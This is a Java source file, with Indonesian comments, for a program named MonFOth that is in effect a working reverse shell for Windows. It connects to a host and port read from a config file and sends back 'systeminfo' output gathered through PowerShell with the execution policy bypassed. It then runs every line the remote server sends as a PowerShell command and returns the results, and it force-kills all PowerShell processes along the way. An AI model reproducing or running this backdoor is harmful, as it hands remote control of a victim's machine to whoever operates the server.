/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package monfoth;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Properties;

/**
 *
 * @author arifika.aop06542
 */
public class MonFOth {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws InterruptedException {

           // TODO code application logic here
        
       try {
            // Membuat koneksi ke server dengan IP dan port tertentu
            //readProp
            Properties prop = readPropertiesFile("config.properties");
            // Membuat koneksi ke server dengan IP dan port tertentu
            
            String ul = prop.getProperty("Url") ;
            int po = Integer.parseInt(prop.getProperty("Port"));

            Socket socket = new Socket(ul, po);

            // Membuat input stream untuk menerima data dari Server
            BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));

            // Membuat output stream untuk mengirim data ke server
            PrintWriter output = new PrintWriter(socket.getOutputStream(), true);
            
            output.println("Koneksi Dibuka");
            
//                ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-Command", "whoami ; ls");
                ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", "systeminfo ; exit");

                // Jalankan perintah PowerShell sebagai proses terpisah
                Process process = processBuilder.start();

                // Baca output dari proses
                BufferedReader whoami = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String whoamiline = "";    
                while ((whoamiline = whoami.readLine()) != null) {
                    output.println(whoamiline);
                }
                killProcess();

                //Current Directory
                String currentPath = System.getProperty("user.dir");
                output.println(currentPath);
                
                process.waitFor();
            
            // Menerima pesan dari server
            String inputLine;
            while((inputLine = input.readLine()) != null){    
                killProcess();
                
//                ProcessBuilder processBuilderStream = new ProcessBuilder("powershell.exe", "-Command", inputLine);
                ProcessBuilder processBuilderStream = new ProcessBuilder("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", inputLine + " ; exit");
                
                // Jalankan perintah PowerShell sebagai proses terpisah
                Process processStream = processBuilderStream.start();

                // Baca output dari proses
                BufferedReader reader = new BufferedReader(new InputStreamReader(processStream.getInputStream()));
                String line;
                
                while ((line = reader.readLine()) != null) {
                    output.println(line);
                    //return  line;
                }
                // Wait for the process to complete
//                
                processStream.waitFor();
//                output.println(reus);
            }
            
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static Properties readPropertiesFile(String fileName) throws IOException {
      FileInputStream fis = null;
      Properties prop = null;
      try {
         fis = new FileInputStream(fileName);
         prop = new Properties();
         prop.load(fis);
      } catch(FileNotFoundException fnfe) {
         fnfe.printStackTrace();
      } catch(IOException ioe) {
         ioe.printStackTrace();
      } finally {
         fis.close();
      }
      return prop;
   }
                
    public static void killProcess() {
        try {
            // Buat objek ProcessBuilder dengan perintah taskkill
            ProcessBuilder processBuilder = new ProcessBuilder("taskkill", "/F", "/IM", "powershell.exe");

            // Jalankan perintah
            Process process = processBuilder.start();

            // Tunggu sampai proses selesai
            process.waitFor();

            System.out.println("Powershell telah dimatikan.");
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
    
}
